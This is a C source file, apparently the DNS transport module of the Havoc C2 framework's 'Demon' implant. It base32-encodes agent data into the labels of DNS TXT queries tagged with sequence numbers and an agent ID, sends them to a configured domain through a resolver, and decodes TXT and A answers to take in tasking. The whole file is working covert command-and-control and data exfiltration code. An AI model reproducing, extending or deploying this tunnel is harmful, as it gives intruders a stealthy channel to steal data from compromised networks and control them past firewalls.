#include <Demon.h>

#include <core/TransportDns.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_DNS

/* ============================================================
 *  Base32 Encoding/Decoding (RFC 4648, lowercase, no padding)
 * ============================================================ */

DWORD DnsBase32Encode(
    _In_  PBYTE  Input,
    _In_  DWORD  InputLen,
    _Out_ PCHAR  Output
) {
    CONST CHAR Alphabet[] = DNS_BASE32_ALPHABET;
    DWORD i      = 0;
    DWORD j      = 0;
    DWORD Bits   = 0;
    DWORD Buffer = 0;

    for ( i = 0; i < InputLen; i++ )
    {
        Buffer = ( Buffer << 8 ) | Input[ i ];
        Bits  += 8;

        while ( Bits >= 5 )
        {
            Bits -= 5;
            Output[ j++ ] = Alphabet[ ( Buffer >> Bits ) & 0x1F ];
        }
    }

    /* handle remaining bits */
    if ( Bits > 0 )
    {
        Output[ j++ ] = Alphabet[ ( Buffer << ( 5 - Bits ) ) & 0x1F ];
    }

    Output[ j ] = '\0';
    return j;
}

DWORD DnsBase32Decode(
    _In_  PCHAR  Input,
    _In_  DWORD  InputLen,
    _Out_ PBYTE  Output
) {
    DWORD i      = 0;
    DWORD j      = 0;
    DWORD Bits   = 0;
    DWORD Buffer = 0;
    CHAR  c      = 0;
    INT   Val    = 0;

    for ( i = 0; i < InputLen; i++ )
    {
        c = Input[ i ];

        if ( c >= 'a' && c <= 'z' )
            Val = c - 'a';
        else if ( c >= 'A' && c <= 'Z' )
            Val = c - 'A';
        else if ( c >= '2' && c <= '7' )
            Val = c - '2' + 26;
        else
            continue;

        Buffer = ( Buffer << 5 ) | Val;
        Bits  += 5;

        if ( Bits >= 8 )
        {
            Bits -= 8;
            Output[ j++ ] = (BYTE)( ( Buffer >> Bits ) & 0xFF );
        }
    }

    return j;
}

/* ============================================================
 *  DNS Packet Construction
 * ============================================================ */

static DWORD DnsWriteName(
    _Out_ PBYTE Buf,
    _In_  PCHAR Name
) {
    DWORD Offset = 0;
    PCHAR Start  = Name;
    PCHAR Ptr    = Name;

    while ( *Ptr )
    {
        if ( *Ptr == '.' )
        {
            DWORD LabelLen = (DWORD)( Ptr - Start );
            if ( LabelLen > DNS_MAX_LABEL_LEN )
                LabelLen = DNS_MAX_LABEL_LEN;

            Buf[ Offset++ ] = (BYTE)LabelLen;
            MemCopy( &Buf[ Offset ], Start, LabelLen );
            Offset += LabelLen;
            Start = Ptr + 1;
        }
        Ptr++;
    }

    if ( Ptr > Start )
    {
        DWORD LabelLen = (DWORD)( Ptr - Start );
        if ( LabelLen > DNS_MAX_LABEL_LEN )
            LabelLen = DNS_MAX_LABEL_LEN;

        Buf[ Offset++ ] = (BYTE)LabelLen;
        MemCopy( &Buf[ Offset ], Start, LabelLen );
        Offset += LabelLen;
    }

    Buf[ Offset++ ] = 0x00;
    return Offset;
}

DWORD DnsBuildQuery(
    _In_  PBYTE  Data,
    _In_  DWORD  DataLen,
    _In_  DWORD  SeqNum,
    _In_  DWORD  TotalParts,
    _Out_ PBYTE  QueryBuf,
    _In_  WORD   QueryType
) {
    PDNS_HDR Header   = NULL;
    DWORD    Offset   = 0;
    CHAR     Name[ DNS_MAX_NAME_LEN + 1 ] = { 0 };
    CHAR     B32Data[ 256 ]  = { 0 };
    CHAR     SeqStr[ 16 ]    = { 0 };
    CHAR     TotalStr[ 16 ]  = { 0 };
    CHAR     AgentStr[ 16 ]  = { 0 };
    DWORD    B32Len   = 0;
    DWORD    NameLen  = 0;
    DWORD    Pos      = 0;

    /* encode data chunk to base32 */
    if ( Data && DataLen > 0 )
    {
        B32Len = DnsBase32Encode( Data, DataLen, B32Data );
    }

    /* integer to string helpers */
    {
        DWORD n = SeqNum;
        DWORD k = 0;
        CHAR  tmp[ 16 ] = { 0 };
        if ( n == 0 ) { tmp[ k++ ] = '0'; }
        while ( n > 0 ) { tmp[ k++ ] = '0' + ( n % 10 ); n /= 10; }
        for ( DWORD m = 0; m < k; m++ ) SeqStr[ m ] = tmp[ k - 1 - m ];
        SeqStr[ k ] = '\0';
    }
    {
        DWORD n = TotalParts;
        DWORD k = 0;
        CHAR  tmp[ 16 ] = { 0 };
        if ( n == 0 ) { tmp[ k++ ] = '0'; }
        while ( n > 0 ) { tmp[ k++ ] = '0' + ( n % 10 ); n /= 10; }
        for ( DWORD m = 0; m < k; m++ ) TotalStr[ m ] = tmp[ k - 1 - m ];
        TotalStr[ k ] = '\0';
    }
    {
        DWORD AgentID = Instance->Session.AgentID;
        CONST CHAR HexChars[] = "0123456789abcdef";
        for ( INT i = 7; i >= 0; i-- )
        {
            AgentStr[ 7 - i ] = HexChars[ ( AgentID >> ( i * 4 ) ) & 0xF ];
        }
        AgentStr[ 8 ] = '\0';
    }

    /* Build FQDN: <b32data_labels>.<seq>.<total>.<agentid>.<domain> */
    Pos = 0;
    while ( Pos < B32Len )
    {
        DWORD ChunkLen = B32Len - Pos;
        if ( ChunkLen > DNS_MAX_LABEL_LEN )
            ChunkLen = DNS_MAX_LABEL_LEN;

        MemCopy( &Name[ NameLen ], &B32Data[ Pos ], ChunkLen );
        NameLen += ChunkLen;
        Name[ NameLen++ ] = '.';
        Pos += ChunkLen;
    }

    /* append seq.total.agentid.domain */
    {
        PCHAR s = SeqStr;
        while ( *s ) { Name[ NameLen++ ] = *s++; }
        Name[ NameLen++ ] = '.';

        s = TotalStr;
        while ( *s ) { Name[ NameLen++ ] = *s++; }
        Name[ NameLen++ ] = '.';

        s = AgentStr;
        while ( *s ) { Name[ NameLen++ ] = *s++; }
        Name[ NameLen++ ] = '.';

        PCHAR Domain = Instance->Config.Transport.Domain;
        while ( *Domain ) { Name[ NameLen++ ] = *Domain++; }
        Name[ NameLen ] = '\0';
    }

    /* Build DNS header */
    Header = (PDNS_HDR)QueryBuf;
    Offset = DNS_HEADER_SIZE;

    Header->ID      = (UINT16)( __rdtsc() & 0xFFFF );
    Header->Flags   = 0x0100; /* standard query, RD=1 */
    Header->QDCount = 0x0100; /* 1 question (big-endian) */
    Header->ANCount = 0;
    Header->NSCount = 0;
    Header->ARCount = 0;

    /* Write question section */
    Offset += DnsWriteName( &QueryBuf[ Offset ], Name );

    /* QTYPE */
    QueryBuf[ Offset++ ] = (BYTE)( QueryType >> 8 );
    QueryBuf[ Offset++ ] = (BYTE)( QueryType & 0xFF );

    /* QCLASS = IN (1) */
    QueryBuf[ Offset++ ] = 0x00;
    QueryBuf[ Offset++ ] = 0x01;

    return Offset;
}

/* ============================================================
 *  DNS Response Parsing
 * ============================================================ */

static DWORD DnsSkipName(
    _In_ PBYTE Buf,
    _In_ DWORD Offset,
    _In_ DWORD BufLen
) {
    while ( Offset < BufLen )
    {
        BYTE Len = Buf[ Offset ];

        if ( ( Len & 0xC0 ) == 0xC0 )
            return Offset + 2;

        if ( Len == 0 )
            return Offset + 1;

        Offset += 1 + Len;
    }

    return Offset;
}

BOOL DnsParseResponse(
    _In_  PBYTE   Response,
    _In_  DWORD   RespLen,
    _Out_ PBYTE*  Output,
    _Out_ PDWORD  OutputLen
) {
    PDNS_HDR Header    = NULL;
    DWORD    Offset    = 0;
    UINT16   AnCount   = 0;
    UINT16   QdCount   = 0;
    WORD     RType     = 0;
    UINT16   RDLength  = 0;
    PBYTE    TempBuf   = NULL;
    DWORD    TempLen   = 0;
    DWORD    TempAlloc = 0;

    if ( RespLen < DNS_HEADER_SIZE )
        return FALSE;

    Header = (PDNS_HDR)Response;

    /* check response flag (QR bit) */
    if ( ( Header->Flags & 0x0080 ) == 0 )
        return FALSE;

    /* swap byte order for counts */
    AnCount = ( ( Header->ANCount >> 8 ) & 0xFF ) | ( ( Header->ANCount & 0xFF ) << 8 );
    QdCount = ( ( Header->QDCount >> 8 ) & 0xFF ) | ( ( Header->QDCount & 0xFF ) << 8 );

    Offset = DNS_HEADER_SIZE;

    /* skip question section */
    for ( UINT16 i = 0; i < QdCount && Offset < RespLen; i++ )
    {
        Offset = DnsSkipName( Response, Offset, RespLen );
        Offset += 4; /* QTYPE + QCLASS */
    }

    if ( AnCount == 0 )
        return FALSE;

    TempAlloc = 4096;
    TempBuf = Instance->Win32.LocalAlloc( LPTR, TempAlloc );
    if ( ! TempBuf )
        return FALSE;

    /* Parse answer records */
    for ( UINT16 i = 0; i < AnCount && Offset < RespLen; i++ )
    {
        Offset = DnsSkipName( Response, Offset, RespLen );

        if ( Offset + 10 > RespLen )
            break;

        RType    = ( Response[ Offset ] << 8 ) | Response[ Offset + 1 ];
        /* skip class (2) + TTL (4) */
        RDLength = ( Response[ Offset + 8 ] << 8 ) | Response[ Offset + 9 ];
        Offset  += 10;

        if ( Offset + RDLength > RespLen )
            break;

        if ( RType == DNS_TYPE_A && RDLength == 4 )
        {
            if ( TempLen + 4 <= TempAlloc )
            {
                MemCopy( &TempBuf[ TempLen ], &Response[ Offset ], 4 );
                TempLen += 4;
            }
        }
        else if ( RType == DNS_TYPE_TXT )
        {
            DWORD RdEnd = Offset + RDLength;
            while ( Offset < RdEnd )
            {
                BYTE TxtLen = Response[ Offset++ ];
                if ( Offset + TxtLen > RdEnd )
                    break;

                BYTE  DecodeBuf[ 256 ] = { 0 };
                DWORD DecodeLen = DnsBase32Decode( (PCHAR)&Response[ Offset ], TxtLen, DecodeBuf );

                if ( TempLen + DecodeLen <= TempAlloc )
                {
                    MemCopy( &TempBuf[ TempLen ], DecodeBuf, DecodeLen );
                    TempLen += DecodeLen;
                }

                Offset += TxtLen;
            }
            continue;
        }

        Offset += RDLength;
    }

    if ( TempLen > 0 )
    {
        *Output    = TempBuf;
        *OutputLen = TempLen;
        return TRUE;
    }

    Instance->Win32.LocalFree( TempBuf );
    return FALSE;
}

/* ============================================================
 *  DNS Transport — Main Send/Receive
 * ============================================================ */

BOOL DnsSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    BOOL    Success     = FALSE;
    PBYTE   SendData    = Send->Buffer;
    DWORD   SendLen     = Send->Length;
    DWORD   TotalParts  = 0;
    DWORD   SeqNum      = 0;
    BYTE    QueryBuf[ DNS_MAX_UDP_SIZE ] = { 0 };
    BYTE    RecvBuf[ 4096 ]              = { 0 };
    DWORD   QueryLen    = 0;
    INT     RecvLen     = 0;
    SOCKET  Sock        = INVALID_SOCKET;
    WSADATA WsaData     = { 0 };

    TotalParts = ( SendLen + DNS_MAX_DATA_PER_QUERY - 1 ) / DNS_MAX_DATA_PER_QUERY;
    if ( TotalParts == 0 )
        TotalParts = 1;

    /* Init winsock if needed */
    if ( ! Instance->WSAWasInitialised )
    {
        Instance->Win32.WSAStartup( MAKEWORD(2,2), &WsaData );
        Instance->WSAWasInitialised = TRUE;
    }

    Sock = Instance->Win32.WSASocketA( AF_INET, SOCK_DGRAM, IPPROTO_UDP, NULL, 0, 0 );
    if ( Sock == INVALID_SOCKET )
    {
        PUTS_DONT_SEND( "Failed to create DNS socket" )
        return FALSE;
    }

    /* Setup DNS server address */
    struct sockaddr_in DnsAddr = { 0 };
    WORD DnsPort = Instance->Config.Transport.DnsPort;
    DnsAddr.sin_family = AF_INET;
    /* manual htons */
    DnsAddr.sin_port = (USHORT)( ( ( DnsPort & 0xFF ) << 8 ) | ( ( DnsPort >> 8 ) & 0xFF ) );

    if ( Instance->Config.Transport.DnsServerIp )
    {
        DnsAddr.sin_addr.s_addr = Instance->Config.Transport.DnsServerIp;
    }
    else
    {
        /* fallback: 8.8.8.8 (already network byte order) */
        DnsAddr.sin_addr.s_addr = 0x08080808;
    }

    /* Connect UDP socket so we can use send/recv */
    Instance->Win32.connect( Sock, (struct sockaddr*)&DnsAddr, sizeof(DnsAddr) );

    /* Send each chunk */
    for ( SeqNum = 0; SeqNum < TotalParts; SeqNum++ )
    {
        DWORD ChunkOffset = SeqNum * DNS_MAX_DATA_PER_QUERY;
        DWORD ChunkLen    = SendLen - ChunkOffset;
        if ( ChunkLen > DNS_MAX_DATA_PER_QUERY )
            ChunkLen = DNS_MAX_DATA_PER_QUERY;

        MemSet( QueryBuf, 0, sizeof(QueryBuf) );
        QueryLen = DnsBuildQuery(
            &SendData[ ChunkOffset ],
            ChunkLen,
            SeqNum,
            TotalParts,
            QueryBuf,
            DNS_TYPE_TXT
        );

        /* Send query */
        Instance->Win32.send( Sock, (char*)QueryBuf, QueryLen, 0 );

        /* Receive response */
        MemSet( RecvBuf, 0, sizeof(RecvBuf) );
        RecvLen = Instance->Win32.recv( Sock, (char*)RecvBuf, sizeof(RecvBuf), 0 );

        if ( RecvLen <= 0 )
        {
            PUTS_DONT_SEND( "DNS recv failed or timed out" )
            goto Cleanup;
        }

        /* Parse response from last chunk (contains full response data) */
        if ( SeqNum == TotalParts - 1 && Resp )
        {
            PBYTE  ParsedData = NULL;
            DWORD  ParsedLen  = 0;

            if ( DnsParseResponse( RecvBuf, RecvLen, &ParsedData, &ParsedLen ) )
            {
                Resp->Buffer = ParsedData;
                Resp->Length = ParsedLen;
                Success = TRUE;
            }
        }
        else
        {
            /* Intermediate chunk — ACK received, continue */
            Success = TRUE;
        }
    }

Cleanup:
    if ( Sock != INVALID_SOCKET )
    {
        Instance->Win32.closesocket( Sock );
    }

    return Success;
}

#endif
